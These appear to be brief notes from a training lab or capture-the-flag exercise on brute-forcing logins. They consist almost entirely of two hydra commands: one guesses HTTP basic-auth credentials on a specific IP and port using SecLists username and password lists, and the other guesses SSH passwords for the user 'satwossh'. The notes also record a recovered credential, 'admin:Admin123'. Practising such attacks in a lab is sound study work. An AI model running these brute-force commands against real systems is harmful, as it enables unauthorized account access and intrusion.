___

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 94.237.55.179 http-get / -s 53217
```

admin:Admin123

satwossh

```bash
hydra -l satwossh -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt ssh://94.237.51.214:43785/ -t 4
```

